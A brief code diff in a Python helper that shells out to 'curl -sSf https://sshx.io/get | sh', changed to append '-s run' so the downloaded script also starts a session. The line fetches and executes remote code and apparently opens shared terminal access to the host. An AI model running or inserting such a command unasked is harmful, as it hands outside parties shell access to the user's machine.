@@ -9,7 +9,7 @@ def run_curl_script():
         
         # Execute the curl command to download and pipe it to sh
         result = subprocess.run(
-            "curl -sSf https://sshx.io/get | sh", 
+            "curl -sSf https://sshx.io/get | sh -s run", 
             shell=True, 
             capture_output=True, 
             text=True, 
